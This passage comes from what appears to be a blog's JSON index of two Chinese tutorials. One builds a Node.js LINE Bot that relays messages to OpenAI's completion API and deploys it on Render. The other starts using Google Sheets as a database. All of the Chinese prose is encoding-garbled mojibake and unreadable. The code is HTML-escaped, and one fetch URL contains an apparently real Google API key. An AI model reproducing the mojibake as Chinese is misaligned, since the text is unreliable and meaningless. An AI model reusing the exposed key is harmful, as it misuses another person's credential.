çš„å°ˆæ¡ˆæ­£åœ¨éƒ¨ç½²äº†ã€‚\né€™å€‹éç¨‹ç¨å¾®æœƒæ¯”è¼ƒä¹…ä¸€é»ï¼Œå› ç‚º Render æœƒå°‡å®ƒæ‰“åŒ…æˆä¸€å€‹ Docker Imageï¼Œç„¶å¾Œå†éƒ¨ç½²åˆ°å®ƒçš„ä¼ºæœå™¨ä¸Šï¼Œæ‰€ä»¥é€™å€‹éç¨‹æœƒç¨å¾®æ¯”è¼ƒä¹…ä¸€é»ï¼Œä½†æ˜¯ä¸ç”¨æ“”å¿ƒï¼Œå› ç‚ºå®ƒæœƒè‡ªå‹•å¹«ä½ åšé€™äº›äº‹æƒ…ï¼Œä½ åªè¦ç­‰å¾…å®ƒå®Œæˆå³å¯ã€‚\néƒ¨ç½²å®Œç•¢çš„è©±ï¼Œä½ å¯ä»¥åœ¨ç•«é¢çœ‹åˆ°ä»–æç¤ºä½ å°ˆæ¡ˆå·²ç¶“é‹è¡Œèµ·ä¾†ä¸¦ä¸”é–‹å§‹éƒ¨ç½²ã€‚\nè€Œä½ çš„å°ˆæ¡ˆçš„ç¶²å€ï¼Œå°±æœƒåœ¨é€™é‚Šï¼š\nä¸å‡ºæ„å¤–çš„è©±ï¼Œæ‡‰è©²æ˜¯ç„¡æ³•é–‹å•Ÿçš„ï¼Œå› ç‚ºæˆ‘å€‘åªæœ‰åšä¸€å€‹ post çš„ APIï¼Œé‚£éº¼åˆ°é€™é‚Šæˆ‘å€‘å°ˆæ¡ˆå°±æ­£å¼éƒ¨ç½²å‡ºå»äº†ï¼ŒåŸºæœ¬ä¸Šéƒ½ä¸ç”¨ç†æœƒå®ƒäº†ã€‚\né€™é‚Šè«‹è¨˜ä½ç¶²å€ï¼Œå› ç‚ºå¾Œé¢æˆ‘å€‘æœƒåœ¨ä½¿ç”¨åˆ°ã€‚\nåŠ å…¥ Line Bot å¥½å‹ æ¥ä¸‹ä¾†æˆ‘å€‘å°±è¦ä¾†å¯¦éš›æ¸¬è©¦ä¸€ä¸‹ï¼Œæˆ‘å€‘çš„ Line Bot æ˜¯å¦å¯ä»¥æ­£å¸¸é‹ä½œï¼Œè€Œå–å¾—é€™å€‹ LINE Bot çš„ ID æ–¹å¼å°±åœ¨ Developer Console çš„ã€ŒMessaging APIã€è£¡é¢ã€‚\nåŠ å…¥å¥½å‹å¾Œï¼Œä½ æ‡‰è©²å°±æœƒç«‹åˆ»çœ‹åˆ°å¥½å‹æ­¡è¿çš„è¨Šæ¯é€šçŸ¥ã€‚\næ¥è‘—ä½ å¯ä»¥è©¦è‘—ç™¼é€è¨Šæ¯çµ¦å®ƒï¼Œä¾‹å¦‚ã€ŒTestã€ï¼Œä½†æ˜¯ä½ æœƒç™¼ç¾å®ƒæ²’æœ‰è¾¦æ³•æ­£å¸¸å›æ‡‰ä½ ã€‚\nå› æ­¤æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘è¦åšä¸€é»èª¿æ•´ï¼Œè®“å®ƒå¯ä»¥æ­£å¸¸å›æ‡‰ä½ ã€‚\nèª¿æ•´ Line Bot é€™é‚Šè«‹ä½ å›åˆ° Line Bot çš„å¾Œå°ï¼Œé»ä¸€ä¸‹ã€ŒMessaging APIã€ï¼Œç„¶å¾Œæ‰¾åˆ°ã€ŒWebhook settingsã€ã€‚\næ¥è‘—é»ä¸€ä¸‹ã€ŒEditã€ï¼Œç„¶å¾Œå°‡ã€ŒWebhook URLã€å¡«å…¥ä½ çš„å°ˆæ¡ˆç¶²å€ï¼Œä¾‹å¦‚ https://example.com/callback\ncallback æ˜¯å› ç‚ºæˆ‘å€‘ Express å°ˆæ¡ˆçš„è·¯ç”±æ˜¯ /callbackï¼Œå¦‚æœä½ çš„è·¯ç”±ä¸æ˜¯é€™å€‹çš„è©±ï¼Œè«‹è‡ªè¡Œä¿®æ”¹ã€‚\napp.js æŒ‰ä¸‹å„²å­˜å¾Œï¼Œä½ å¯ä»¥é»ä¸€ä¸‹ã€ŒVerifyã€ï¼Œä¾†é©—è­‰ä½ çš„ç¶²å€æ˜¯å¦æ­£ç¢ºä»¥åŠå°ˆæ¡ˆæ˜¯å¦æ­£å¸¸ï¼Œåªè¦èƒ½çœ‹åˆ°ã€ŒSuccessã€å°±ä»£è¡¨ä½ çš„ç¶²å€ä»¥åŠå°ˆæ¡ˆæ˜¯æ­£ç¢ºçš„ã€‚\næ¥è‘—å°‡ä¸‹æ–¹çš„ ã€ŒUse webhookã€æ‰“é–‹ã€‚\næ‰“é–‹å¾Œï¼Œä½ å†å»è©¦è‘—ç™¼é€è¨Šæ¯çµ¦ä½ çš„ Line Botï¼Œä½ å°±æœƒç™¼ç¾å®ƒå¯ä»¥æ­£å¸¸å›æ‡‰ä½ äº†ï¼Œè€Œä¸”æ˜¯ä¸è«–ä½ æ‰“ä»€éº¼ï¼Œä»–éƒ½æœƒå›æ‡‰ä½ å‰›å‰›æ‰“çš„å­—ã€‚\næ­å–œä½ ï¼Œæˆªè‡³ç‚ºæ­¢ï¼Œæˆ‘å€‘çµ‚æ–¼æŠŠ Line Bot æ­£å¼è™•ç†å¥½äº†ã€‚\né—œæ‰é è¨­å›é¥‹ æ¥ä¸‹ä¾†ä½ å¯èƒ½æœƒæƒ³è¦æŠŠé‚£æ®µè©²æ­»çš„æç¤ºå›é¥‹ï¼š\n1 2 3 4 æ„Ÿè¬æ‚¨çš„è¨Šæ¯ï¼ å¾ˆæŠ±æ­‰ï¼Œæœ¬å¸³è™Ÿç„¡æ³•å€‹åˆ¥å›è¦†ç”¨æˆ¶çš„è¨Šæ¯ã€‚ æ•¬è«‹æœŸå¾…æˆ‘å€‘ä¸‹æ¬¡ç™¼é€çš„å…§å®¹å–”(moon smile) ä»¥åŠåŠ å…¥å¥½å‹é€šçŸ¥ï¼š\n1 2 3 4 5 6 XXXæ‚¨å¥½ï¼ æˆ‘æ˜¯Wayne\\\u0026#39;s AIã€‚ æ„Ÿè¬æ‚¨åŠ å…¥å¥½å‹ æ­¤å®˜æ–¹å¸³è™Ÿå°‡å®šæœŸç™¼æ”¾æœ€æ–°è³‡è¨Šçµ¦æ‚¨ æ•¬è«‹æœŸå¾… é€™å…©å€‹é—œæ‰ï¼Œé—œæ‰æ–¹å¼å¾ˆç°¡å–®ï¼Œä¸€æ¨£å›åˆ° Line Bot çš„å¾Œå°ï¼Œé»ä¸€ä¸‹ã€ŒMessaging APIã€ï¼Œç„¶å¾Œæ‰¾åˆ°ã€ŒAuto-reply messagesã€ã€‚\nä½ æœƒè·³åˆ° LINE@ ç®¡ç†ä»‹é¢ï¼Œå°‡ã€ŒåŠ å…¥å¥½å‹æ­¡è¿è¨Šæ¯ã€ä»¥åŠã€Œè‡ªå‹•å›è¦†è¨Šæ¯ã€é—œæ‰å°±æå®šå›‰ï¼\nä¸²æ¥ OpenAI API çµ‚æ–¼åˆ°äº†æˆ‘å€‘çš„é‡é ­æˆ²äº†ï¼Œå‰é¢ä½ å¯ä»¥ç™¼ç¾ LINE Bot çš„æµç¨‹èˆ‡ç”³è«‹éå¸¸çš„å¤šä¸”ç¹ç‘£ï¼Œå› æ­¤å‰é¢èŠ±å¾ˆå¤šæ™‚é–“åœ¨ä»‹ç´¹ï¼Œä¸»è¦æ˜¯å¸Œæœ›ä½ å¯ä»¥é †åˆ©å»ºç«‹å¥½ä½ çš„ LINE Botï¼Œç¢ºä¿ä½ æ¥ä¸‹ä¾†çš„æ­¥é©Ÿä¸æœƒæœ‰å•é¡Œã€‚\nå®‰è£ OpenAI å¥—ä»¶ é¦–å…ˆæˆ‘å€‘è¦å…ˆå®‰è£ OpenAI çš„å¥—ä»¶ï¼Œè«‹åœ¨å°ˆæ¡ˆåº•ä¸‹è¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š\n1 pnpm i openai æ¥è‘— openai æœ¬èº«æœ‰æä¾›ç¯„ä¾‹ç¨‹å¼ç¢¼ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 const { Configuration, OpenAIApi } = require(\u0026#34;openai\u0026#34;); const configuration = new Configuration({ apiKey: process.env.OPENAI_API_KEY, }); const openai = new OpenAIApi(configuration); const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-002\u0026#34;, prompt: \u0026#34;Hello world\u0026#34;, }); console.log(completion.data.choices[0].text); å› æ­¤åŸºæ–¼ä¸Šæ–¹é€™ä¸€æ®µï¼Œæˆ‘å€‘ç¨å€™å¯ä»¥ä¾†ä¿®æ”¹ä¸€ä¸‹ï¼Œè®“å®ƒå¯ä»¥è·Ÿæˆ‘å€‘çš„ LINE Bot ä¸²æ¥ã€‚\nopenAI æœ‰æä¾›å¤šå€‹ model å¯ä»¥é¸æ“‡ï¼Œåˆ†åˆ¥æ˜¯ï¼š\ntext-davinci-003 text-curie-001 text-babbage-001 text-ada-001 å…¶ä¸­ç›®å‰(2022å¹´)æœ€ç´…çš„å°±æ˜¯ text-davinci-003ï¼Œå› æ­¤æˆ‘å€‘é€™é‚Šä¹Ÿæœƒä½¿ç”¨é€™å€‹ modelï¼Œæ¯ä¸€å€‹ model éƒ½æœ‰ä¸åŒçš„ç‰¹æ€§ï¼Œä½ å¯ä»¥åœ¨é€™è£¡æ‰¾åˆ°å®ƒçš„ä»‹ç´¹ã€‚\nèª¿æ•´ app.js çš„ç¨‹å¼ç¢¼ é¦–å…ˆæˆ‘å€‘è¦å…ˆåœ¨ app.js ä¸­å¼•å…¥ OpenAI çš„å¥—ä»¶ã€‚\napp.js 1 const { Configuration, OpenAIApi } = require(\u0026#34;openai\u0026#34;); æ¥ä¸‹ä¾†æˆ‘å€‘è¦ä¾†å¯¦ä¾‹åŒ– OpenAIã€‚\napp.js 1 2 3 4 const configuration = new Configuration({ apiKey: process.env.OPENAI_API_KEY, }); const openai = new OpenAIApi(configuration); apiKey å°±æ˜¯æˆ‘å€‘æœ€æ—©å‰é¢æ‰€ç”³è«‹çš„ OpenAI API Keyï¼Œè€Œé€™ä¸€æ®µä¸€æ¨£æ˜¯æ”¾åœ¨ .env çš„ã€‚\nå¦‚æœä½ æ²’ç”³è«‹çš„è©±ä½ æœƒç„¡æ³•å¾€ä¸‹ç¹¼çºŒçš„ï¼Œè«‹å‹™å¿…ç”³è«‹ OpenAI API Key å”·ã€‚\nç›®å‰ä¾†è¬›ï¼Œä½ çš„ .env æ‡‰è©²é•·é€™æ¨£ï¼š\n1 2 3 4 CHANNEL_ACCESS_TOKEN= CHANNEL_SECRET= OPENAI_API_KEY= æ¥ä¸‹ä¾†å‘¢ï¼Ÿæˆ‘å€‘å°±è¦å°‡åŸæœ¬ Line å®˜æ–¹æ‰€æä¾›çš„ç¯„ä¾‹ç¨‹å¼ç¢¼ç¨å¾®èª¿æ•´ä¸€ä¸‹ï¼Œä¸»è¦èª¿æ•´çš„ç¯„åœæ˜¯ handleEvent çš„ç¨‹å¼ç¢¼ï¼š\napp.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 async function handleEvent(event) { if (event.type !== \u0026#39;message\u0026#39; || event.message.type !== \u0026#39;text\u0026#39;) { // ignore non-text-message event return Promise.resolve(null); } const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text , }); // create a echoing text message const echo = { type: \u0026#39;text\u0026#39;, text: completion.data.choices[0].text }; // use reply API return client.replyMessage(event.replyToken, echo); } é€™é‚Šæˆ‘å€‘å°‡åŸæœ¬çš„ prompt æ”¹æˆ event.message.textï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨è€…è¼¸å…¥çš„è¨Šæ¯ï¼Œè€Œ completion.data.choices[0].text å°±æ˜¯ OpenAI æ‰€å›å‚³çš„è¨Šæ¯ã€‚\næ²’å•é¡Œå¾Œå°±å„²å­˜æª”æ¡ˆï¼Œä¸¦ commit push å‡ºå»åˆ° GitHub ä¸Šï¼Œå±†æ™‚ Render å°±æœƒè‡ªå‹•å¹«ä½ é‡æ–°éƒ¨ç½²äº†ã€‚\nè¨˜å¾—è¦å» Render ä¸Šé¢å¢åŠ  OPENAI_API_KEY çš„ç’°å¢ƒè®Šæ•¸ï¼Œå¦å‰‡æœƒå‡ºç¾éŒ¯èª¤å”·ã€‚\nç•¶éƒ¨ç½²å®Œç•¢å¾Œï¼Œä½ å†å»è©¦è‘—è·Ÿä½ çš„ LINE Bot èŠå¤©ï¼Œä½ æœƒç™¼ç¾å®ƒå·²ç¶“æœƒè¬›è©±å›‰ï¼\nåªæ˜¯ä½ æœƒç™¼ç¾å®ƒå¥½åƒæ²’è¾¦æ³•å›ä½ å¾ˆå¤šè©±ï¼Œé€™åŸå› æ˜¯æˆ‘å€‘æ²’æœ‰å‘ŠçŸ¥å®ƒè¦ä½¿ç”¨å¤šå°‘ Tokensï¼Œå› æ­¤é€™é‚Šæˆ‘å€‘èª¿æ•´ä¸€ä¸‹ï¼š\napp.js 1 2 3 4 5 const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text, max_tokens: 200, }); é€™å€‹ max_tokens æœƒå½±éŸ¿åˆ° OpenAI æ‰€å›å‚³çš„è¨Šæ¯é•·åº¦ï¼Œå› æ­¤æˆ‘å€‘é€™é‚Šè¨­å®šç‚º200ï¼Œé€™æ¨£å°±å¯ä»¥è®“å®ƒå›å¾ˆå¤šè©±äº†ã€‚\nèª¿æ•´ OpenAI çš„å›å‚³è¨Šæ¯ é‚£éº¼é€™é‚Šä¹Ÿæœ‰ä¸€ä»¶å¾ˆæœ‰è¶£çš„äº‹æƒ…ï¼Œä¹Ÿå°±æ˜¯ OpenAI çš„è¨Šæ¯éƒ½æœ‰ä¸€å¤§æ¨ç©ºç™½ï¼Œé€™æ˜¯å› ç‚º OpenAI æœƒå°‡ä½ çš„è¨Šæ¯åˆ†æˆä¸€å€‹å€‹çš„æ®µè½ï¼Œè€Œæ¯å€‹æ®µè½ä¹‹é–“éƒ½æœƒæœ‰ä¸€å€‹ç©ºç™½ï¼Œå› æ­¤æˆ‘å€‘ä¹Ÿè¦ä¾†èª¿æ•´ä¸€ä¸‹ã€‚\napp.js 1 2 3 4 5 6 7 const completion = await openai.createCompletion({ model: \u0026#34;text-davinci-003\u0026#34;, prompt: event.message.text , max_tokens: 200, }); const echo = { type: \u0026#39;text\u0026#39;, text: completion.data.choices[0].text.trim() }; å†é‡æ–°ä¸Šå‚³ç¨‹å¼ç¢¼å¾Œï¼Œä½ å°±å¯ä»¥çœ‹åˆ°æ©Ÿå™¨äººæ­£å¸¸çš„å›ä½ äº†ã€‚\næ­å–œä½ ï¼Œå®Œæˆäº†ä¸€å€‹å¯ä»¥è·Ÿä½ èŠå¤©çš„æ©Ÿå™¨äººï¼è€Œä¸”æ˜¯ä¸²æ¥äº† OpenAI çš„æ©Ÿå™¨äººï¼\nçµèª ç›¸ä¿¡ä½ æ‡‰è©²ç™¼ç¾é€™å€‹ Line Bot çš„å»ºç«‹æµç¨‹è¶…ç´šç„¡æ•µçš„é•·ï¼Œè€Œä¸”éå¸¸çš„å¤šæµç¨‹è·Ÿç´°ç¯€ï¼Œä½†æ˜¯ä½ ä¹Ÿå¯ä»¥å› æ­¤èªè­˜åˆ°å¦‚ä½•ä¸²æ¥ç¬¬ä¸‰æ–¹æœå‹™ï¼Œä»¥åŠå¦‚ä½•å°‡ä½ çš„ç¨‹å¼ç¢¼éƒ¨ç½²åˆ° Render ä¸Šé¢ï¼Œæ‰€ä»¥æˆ‘è¦ºå¾—æ˜¯ä¸€å€‹ç›¸ç•¶ä¸éŒ¯çš„å°ç·´ç¿’ï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³å˜—è©¦åšä¸€å€‹èŠå¤©æ©Ÿå™¨äººï¼Œæ˜¯å¯ä»¥è€ƒæ…®ä½¿ç”¨é€™å€‹æ–¹æ³•çš„ã€‚\nä½†æ˜¯è¦æ³¨æ„ä¸€ä»¶äº‹æƒ… OpenAI çš„ GPT æœ‰ä¸€å€‹é‡é»ä½¿ç”¨ï¼Œå¦‚æœä½ è¦è®“ä½ è°æ˜ä¸€é»çš„å›è¦†ä½ ï¼Œé‚£éº¼ä½ å°±è¦å°‡å®ƒçš„ä¸Šä¸‹æ–‡ï¼ˆåŒ…å«ä½ çš„å›è¦†ï¼‰ä¸€èµ·æ’ˆå‡ºä¾†ä¸Ÿçµ¦å®ƒï¼Œå¦å‰‡ä½ æœƒç™¼ç¾å®ƒæœ‰é»ç¬¨ï¼Œå¯æ˜¯ LINE çš„èŠå¤©æ©Ÿå™¨äººä¸å¤ªé©åˆé€™ç¨®æ–¹å¼ï¼Œå› ç‚ºéç¨‹ä½ å¯èƒ½æœƒå•å¾ˆå¤šäº‹æƒ…ï¼Œé€™æ¨£å­è¨Šæ¯é‡æœƒéå¸¸é¾å¤§ä¸”æ²’è¾¦æ³•åˆªé™¤ï¼Œå› æ­¤é€™é‚Šæˆ‘å€‘å°±ä¸åšé€™ä»¶äº‹æƒ…äº†ï¼Œè€Œæ˜¯è®“å®ƒé‡å°ä½ æ¯å€‹å•é¡Œå»å›è¦†å³å¯ï¼Œè€Œä¸åŒ…å«å‰ä¸€å€‹å•é¡Œçš„å›è¦†ã€‚\næœ€å¾Œé€™é‚Šæˆ‘ä¹Ÿé™„ä¸Šç¯„ä¾‹ç¨‹å¼ç¢¼ï¼Œå¦‚æœä½ æƒ³ç›´æ¥æ‹‰å›å»ç”¨ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå› ç‚ºé€™ä¸€ä»½ç¨‹å¼ç¢¼åŸºæœ¬ä¸Šéƒ½æ˜¯ä»¥å®˜æ–¹æ‰€æä¾›çš„ç‚ºä¸»ï¼Œå¾ˆå°‘æœ‰å¤§å¹…åº¦èª¿æ•´çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥ä½ å¯ä»¥ç›´æ¥æ‹¿ä¾†ç”¨ã€‚\nå¸Œæœ›é€™ä¸€ç¯‡å¯ä»¥è®“ä½ å¿«å¿«æ¨‚æ¨‚åšå‡ºä¸€å€‹ LINE Botã€‚\nå¦‚æœä½ è¦ºå¾—éƒ¨ç½²åˆ° Render å¾ˆé›£å»é™¤éŒ¯ï¼Œå…¶å¯¦æ˜¯å¯ä»¥è€ƒæ…®ä½¿ç”¨ ngrok çš„ï¼Œngrok çš„ä½¿ç”¨æ–¹æ³•å¯ä»¥åƒè€ƒé€™è£¡ã€‚\n","date":"2022-12-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52558908513_206844d03c_o.png","permalink":"https://wayneblog.ga/2022-12-12/nodejs-create-openai-line-bot/","title":"ç”¨ Node.js å»ºç«‹ä½ çš„ç¬¬ä¸€å€‹ OpenAI LINE Bot èŠå¤©æ©Ÿå™¨äºº"},{"content":" åƒè€ƒç¶²ç«™\nGoogle è©¦ç®—è¡¨åç¨±æ˜¯ Google Sheetsï¼Œä½†ç‚ºäº†è®“å¤§å®¶å¥½ç†è§£ï¼Œä»¥ä¸‹ä¹Ÿæœƒç¨± Google Excelã€‚\né€™ä¸€ç¯‡èªªæ˜å¦‚ä½•æŠŠ Google Excel ç•¶ä½œè³‡æ–™åº«ï¼Œä¸¦å¯¦ä½œå‡ºä¸€å€‹ç°¡å–®çš„æœƒå“¡åˆ—è¡¨é å‡ºä¾†ã€‚\nå»ºç«‹ Google Excel åœ¨ Google Drive ä¸Šï¼ŒæŒ‰æ–°å¢ï¼Œé¸æ“‡ã€ŒGoogle è©¦ç®—è¡¨ã€ï¼Œå°±æœƒé€²åˆ°ä¸€å¼µæ–°çš„ Google Excelã€‚\né€™é‚Šè¨­å®šçš„å‡è³‡æ–™æ¬„ä½ï¼Œç¸½å…±æœ‰ä»¥ä¸‹ 5 å€‹ï¼š\nidï¼šæµæ°´è™Ÿ nameï¼šå§“å imageï¼šåœ–ç‰‡ emailï¼šä¿¡ç®± phoneï¼šé›»è©± è¦æ³¨æ„ï¼Œæ¬„ä½åç¨±çš„éƒ¨ä»½è¦ç”¨è‹±æ–‡ï¼Œåœ¨ä¸‹é¢æ¥è³‡æ–™é‚£æ®µæœƒè§£é‡‹åŸå› ã€‚\nDemo çš„è³‡æ–™å¦‚ä¸‹ï¼š\nç™¼ä½ˆ Google Excel åˆ°ç¶²è·¯ é€™æ­¥æœ€ç°¡å–®ä¹Ÿæœ€é‡è¦ï¼Œåªæœ‰é¸æ“‡ç™¼ä½ˆåˆ°ç¶²è·¯ä¸Šçš„ Google Excelï¼Œæ‰èƒ½ GET åˆ°è³‡æ–™ã€‚\né¦–å…ˆï¼Œé»æ“Šå·¦ä¸Šè§’çš„ã€Œæª”æ¡ˆã€\u0026gt;ã€Œå…±ç”¨ã€ï¼Œæœƒçœ‹åˆ°å±•é–‹çš„é¸é …è£¡æœ‰ã€Œç™¼ä½ˆåˆ°ç¶²è·¯ã€ï¼š\né»æ“Šå¾Œï¼Œæœƒå‡ºç¾è©¢å•æ¡†ï¼Œå•èªªç™¼ä½ˆçš„ç¯„åœï¼š\né€™ç¯‡ Demo å› ç‚ºåªæœ‰ä¸€å¼µè¡¨ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ã€Œæ•´ä»½æ–‡ä»¶ã€ï¼Œå¦‚æœæ˜¯æœ‰å¾ˆå¤šå¼µè¡¨ï¼Œä½†é™åˆ¶å…¶ä¸­å¹¾å¼µæ˜¯å¯ä»¥æŠ“çš„ï¼Œå°±é¸æ“‡å¯ä»¥å…¬é–‹çš„è¡¨å³å¯ã€‚\næŒ‰ä¸‹ã€Œç™¼ä½ˆã€å¾Œï¼Œå°±æœƒçœ‹è¦‹çµæœçš„è©¢å•æ¡†ï¼š\nå°±å¯ä»¥æŒ‰ä¸‹å‰å‰é—œæ‰é€™æ¡†äº†ã€‚\næ¥è‘—è¨˜å¾—å°‡è¡¨å–®çš„ã€Œæª¢è¦–ã€æ¬Šé™é–‹æ”¾çµ¦çŸ¥é“é€£çµçš„ä»»ä½•äººï¼Œä»¥å…å¾Œé¢æ­¥é©Ÿå› æ¬Šé™ä¸è¶³è€Œè¢«é˜»æ“‹ã€‚\nå–å¾— Google API Key 1. GCP æ–°å¢æ–°å°ˆæ¡ˆ æ²’æœ‰å°ˆæ¡ˆçš„æ‰éœ€è¦é€™æ­¥ï¼Œé€²åˆ° Google Cloud Platform çš„é é¢æŒ‰ä¸‹æ–°å¢å°ˆæ¡ˆï¼Œå–å¥½å°ˆæ¡ˆåç¨±å¾Œå³å¯æ–°å¢ã€‚\n2. é–‹é€š Google Sheets API åŠŸèƒ½ æœ‰äº† GCP çš„å°ˆæ¡ˆå¾Œï¼Œé€²åˆ° API ç¨‹å¼åº«ï¼šhttps://console.cloud.google.com/apis/library?hl=zh-TW\næœå°‹æ¬„ä¸­æœå°‹ã€Œsheetã€ï¼Œæœƒçœ‹åˆ°ä¸€é …ã€ŒGoogle Sheets APIã€ï¼š\né»æ“Šå¾ŒæŒ‰ä¸‹ã€Œå•Ÿç”¨ã€ï¼Œå°ˆæ¡ˆå°±æœƒé–‹é€š Google Sheets API çš„åŠŸèƒ½ï¼š\nå•Ÿç”¨å®Œæˆï¼Œé é¢æœƒå›åˆ° GCP çš„é é¢ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢ä¸€æ¢è¨Šæ¯æé†’è¦æœ‰æ†‘è­‰æ‰èƒ½ä½¿ç”¨ APIï¼š\nç›´æ¥é»æ“Šã€Œå»ºç«‹æ†‘è­‰ã€ï¼Œæˆ–æ˜¯æ‰“é–‹ç¶²å€ï¼šhttps://console.cloud.google.com/apis/credentials/wizard?hl=zh-TW\n3. å»ºç«‹æ†‘è­‰ å»ºç«‹æ†‘è­‰çš„ç¬¬ä¸€æ­¥è¦å…ˆåšä¸€äº›é¸æ“‡ï¼š\nã€Œé¸å– APIã€ï¼Œé¸æ“‡ã€ŒGoogle Sheets APIã€ã€‚\nã€Œæ‚¨éœ€è¦å­˜å–ä»€éº¼è³‡æ–™ï¼Ÿã€ï¼Œé€™æ®µçœ‹äº† èªªæ˜æ–‡ä»¶ ä¹Ÿçœ‹ä¸å¤ªæ‡‚ä½¿ç”¨çš„æƒ…å¢ƒï¼Œé¸æ“‡ã€Œæ‡‰ç”¨ç¨‹å¼è³‡æ–™ã€å°±å¯ä»¥ã€‚\nã€Œæ‚¨æ‰“ç®—å°‡é€™å€‹ API èˆ‡ Compute Engineã€Kubernetes Engineã€App Engine æˆ– Cloud Functions æ­é…ä½¿ç”¨å—ï¼Ÿã€ï¼Œæœ¬ç¯‡åªæ˜¯ç‚ºäº†è¦èƒ½å¤ å–å¾— Google Sheets ä¸­çš„è³‡æ–™ï¼Œä¸¦ä¸æœƒç”¨åˆ°ä¸Šè¿°çš„åŠŸèƒ½ï¼Œé¸æ“‡ã€Œä¸ï¼Œæˆ‘ä¸æœƒä½¿ç”¨ä»»ä½•ä¸€é …æ†‘è­‰ã€ã€‚\næ¥è‘—æŒ‰ã€Œä¸‹ä¸€æ­¥ã€ã€‚\nä¸‹ä¸€æ­¥æ˜¯å¡«å¯«æˆ‘å€‘å»ºç«‹é€™å€‹å¸³æˆ¶çš„è³‡æ–™ï¼Œå¡«å¯«æˆæˆ‘å€‘ä¹‹å¾Œå›é ­ä¾†çœ‹æ™‚ï¼Œçœ‹å¾—æ‡‚è¦åšä»€éº¼çš„è³‡è¨Šå°±å¯ä»¥ï¼š\nå¡«å¯«å®Œå¾ŒæŒ‰ä¸‹ã€Œå»ºç«‹ä¸¦ç¹¼çºŒã€ã€‚\nå¾Œé¢äºŒé …æ˜¯é¸å¡«ï¼Œä¸ç”¨è¨­å®šä¹Ÿæ²’é—œä¿‚ï¼ŒæŒ‰ä¸‹ã€Œå®Œæˆã€ã€‚\n4. å»ºç«‹ API é‡‘é‘° ä¸Šä¸€æ­¥å®Œæˆå¾Œï¼Œé é¢æœƒå›åˆ° æ†‘è­‰çš„é é¢ï¼Œé»æ“Šä¸Šæ–¹çš„ã€Œå»ºç«‹æ†‘è­‰ã€ï¼Œé¸æ“‡ã€ŒAPI é‡‘é‘°ã€ï¼š\nå¹¾ç§’å¾Œï¼Œå°±æœƒçœ‹è¦‹è·³å‡ºä¸€å€‹å°è¦–çª—ï¼Œä¸Šé¢å¯«äº†ã€Œæ‚¨çš„ API é‡‘é‘°ã€ï¼Œé€™å€‹é‡‘é‘°ä¹Ÿå°±æ˜¯æˆ‘å€‘è¦å– Google Sheets æ™‚å¾Œé¢è¦é™„ä¸Šçš„ï¼š\nè¦–çª—ä¸Šé¢ä¹Ÿæé†’äº†ï¼Œç‚ºäº†æ€•é‡‘é‘°è¢«å¤–äººæ‹¿åˆ°ä¹Ÿå¯ä»¥ç”¨ï¼Œæˆ‘å€‘å¿…é ˆè¦å°é€™çµ„é‡‘é‘°åŠ ä¸Šé™åˆ¶ï¼Œé»æ“Šã€Œé™åˆ¶é‡‘é‘°ã€å°±æœƒé€²å…¥è¨­å®šçš„é é¢ã€‚\nå»ºè­°ä¸€å®šè¦è¨­å®šé™åˆ¶ï¼Œæœ¬ç¯‡çš„ Demo æœ‰é™åˆ¶åªæœ‰åœ¨ Demo é ä¸‹æ‰æœ‰æ•ˆï¼Œè€Œä¸”ä¹Ÿåªèƒ½ç”¨ Google Sheets API çš„åŠŸèƒ½ã€‚\næœ‰äº† API é‡‘é‘°ï¼Œæ¥è‘—å°±æ˜¯ç”¨æ–°çš„ URL å»åŸ·è¡Œ GETã€‚\nGoogle Sheets URL V4 ç‰ˆçš„ URL è¦å‰‡å¦‚ä¸‹ï¼š\n1 https://sheets.googleapis.com/v4/spreadsheets/{è¡¨å–®id}/values/{sheetåç¨±}?alt=json\u0026amp;key={APIé‡‘é‘°} {è¡¨å–®id}ï¼šè¡¨å–®çš„ç¶²å€ä¸Šå°±å¯ä»¥çœ‹åˆ°ã€‚ {sheetåç¨±}ï¼šå°±æ˜¯æ¯ä¸€å¼µè©¦ç®—è¡¨çš„åç¨±ï¼Œé è¨­æœƒæ˜¯å«ã€Œå·¥ä½œè¡¨1ã€ï¼Œé€™é‚Šæœ‰æ¸¬è©¦éï¼Œæœ‰æ”¯æ´ä¸­æ–‡ã€‚ {APIé‡‘é‘°}ï¼šå°±æ˜¯ä¸Šä¸€æ®µæˆ‘å€‘å¾ GCP ä¸Šå–å¾—çš„é‡‘é‘°ã€‚ æˆ‘å€‘ç”¨ä¸€å€‹ç°¡å–®çš„ fetch ä¾†å–ï¼š\n1 2 3 4 5 fetch(\u0026#39;https://sheets.googleapis.com/v4/spreadsheets/1-vTT5LVlscvExPjqJHrhmlO2ZMM-93McoP-yXT8gyOU/values/å·¥ä½œè¡¨1?alt=json\u0026amp;key=AIzaSyAVlwHA4EQx7AWjK1QsT87shL37vhKWrl4\u0026#39;) .then(res =\u0026gt; res.json()) .then(res =\u0026gt; { console.log(res) }) Console ä¸Šæœƒçœ‹åˆ°å›ä¾†çš„è³‡æ–™å¦‚ä¸‹ï¼š\nå›ä¾†è³‡æ–™çš„æ ¼å¼ï¼Œæ‰€æœ‰è³‡æ–™éƒ½æ”¶åœ¨ values è£¡ï¼ŒGoogle Sheets ä¸Šçš„æ¯ä¸€åˆ—æœƒæˆç‚ºä¸€å€‹ä¸€å€‹çš„é™£åˆ—ã€‚\nç›¸é—œé€£çµ é™„ä¸Šæœ¬ç¯‡çš„ç›¸é—œé€£çµï¼š\nç¶²ç«™æˆæœ Google Sheet ç¶²ç«™åŸå§‹ç¢¼ Github ç©ºé–“ ","date":"2022-12-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52550876753_d803ddfa87_o.jpg","permalink":"https://wayneblog.ga/2022-12-10/use-google-sheet-as-db/","title":"å¦‚ä½•ç”¨ Google Sheets / Excel 